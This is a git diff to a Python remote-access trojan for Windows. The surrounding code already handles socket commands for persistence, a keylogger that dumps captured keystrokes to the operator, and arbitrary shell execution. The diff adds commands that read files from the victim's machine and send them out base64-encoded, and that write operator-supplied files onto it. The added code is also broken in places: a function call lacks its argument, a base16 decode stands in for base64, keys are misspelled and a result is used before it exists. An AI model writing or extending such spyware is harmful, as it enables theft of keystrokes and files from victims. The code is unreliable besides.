@@ -1,11 +1,14 @@
 from datetime import datetime
 from pynput import keyboard
+from pathlib import Path
 from time import time
+
 
 import subprocess
 import shutil
 import socket
 import winreg
+import base64
 import os
 import sys
 
@@ -21,6 +24,58 @@ keylog_buffer = []
 buffer_auto_send_pending = False
 keylloger_active = False
 listener = None
+
+
+def dowload_file(filepath):
+    try:
+        if not os.path.exists(filepath):
+            return{
+                'sucess': False,
+                'error': 'File not found',
+            }
+
+        with open(filepath, 'rb') as f:
+            file_data = f.read()
+        
+        return{
+            'success': True,
+            'filename': Path(filepath).name,
+            'data': base64.b64encode(file_data).decode('utf-8'),
+            'size': len(file_data)
+        }
+    
+    except Exception as e:
+        return{
+                'sucess': False,
+                'error': str(e),
+        }
+
+
+def upload_file(filepath, file_base64):
+    
+    try:
+        file_data = base64.b16decode(file_base64)
+        
+        
+        directory = os.path.dirname(filepath)
+        if directory and not os.path.exists(directory):
+            os.makedirs(directory)
+        
+        with open (filepath, 'wb') as f :
+            f.write(file_data)
+        
+        file_size = len(file_data)
+        
+        return{
+            'success': True,
+            'filepath': filepath,
+            'size': len(file_data)
+        }
+    except Exception as e:
+        return {
+            'success': False,
+            'error': str(e)
+        }
 
 def format_key(key):
     try:
@@ -204,28 +259,98 @@ def cmd(c, data):
             else:
                 c.send(b'[-] Persistence Status: FAIL\n\n')
                 return
+            
+        
         elif data == '/Persistence setup':
             setup_persistence()
             c.send(b'[+] Done\n\n')
             return
+        
+        
         elif data == '/Keylog start':
             response = start_keylogger()
             c.send(response.encode() + b'\n\n')
             return
+        
+        
         elif data == '/Keylog stop':
             response = stop_keylogger()
             c.send(response.encode() + b'\n\n')
             return
+        
+        
         elif data == '/Keylog dump':
             response = get_keylog_data()
             c.send(response.encode() + b'\n\n')
             return
+        
+        
         elif data == '/Keylog status':
             status = 'running' if keylloger_active else 'stopped'
             buffer_size = len(keylog_buffer)
             response = f'[i] keylloger status: {status}\n[i] Buffer:{buffer_size} Keys'
             c.send(response.encode() + b'\n\n')
             return  
+        
+        
+        elif data == 'keylog status':
+            status = 'Running' if keylloger_active else 'Stopped'
+            buffer_size = len(keylog_buffer)
+            response = f'[i] Keylogger status: {status}\n[i] Buffer: {buffer_size} keys'
+            c.send(response.encode() + b'\n\n')
+            return
+            
+        elif data.startswith('/download'):
+            filepath = data[10:].strip()
+            c.send(b'[i] Preparing file for download ...\n')
+            
+            result = dowload_file()
+            
+            if result['sucess']:
+                info = (
+                    f'[+] File ready for download\n'
+                    f'[i] Filename: {result['filename']}\n'
+                    f'[i] Size: {result['size']} bytes\n'
+                    f'[FILE_START]\n'
+                )
+                c.send(info.encode())
+                c.send(result['data'].encode())
+                c.send(b'\n[FILE_END]\n\n')
+            
+            else:
+                c.send(f'[-] Download failed: {result['error']}\n\n'.encode())
+                return
+
+        elif data.startswith('/upload'):
+            filepath = data[8:].strip()
+            c.send(b'[i] Ready to receive file.\n')
+            
+            c.settimeout(30)
+            file_data = b''
+            
+            while True:
+                chunk = c.recv(4096)
+                if not chunk:
+                    break
+            
+                file_data += chunk
+                
+                if b'[UPLOAD_END]' in file_data:
+                    break
+            
+            file_base64 = file_data.split(b'[UPLOAD_END]')[0].decode('utf-8').strip()
+            
+            if result ['success']:
+                response = (
+                    f'[+] File uploaded sucefully!\n'
+                    f'[i] Path: {result['filepath']}\n'
+                    f'[i] Size: {result['size']} bytes\n'
+                )
+                c.send(response.encode() + b'\n')
+            else:
+                c.send(f'[-] Upload Failed: {result['error']}\n\n'.encode())
+                return
+        
         else:
             
             p = subprocess.Popen(
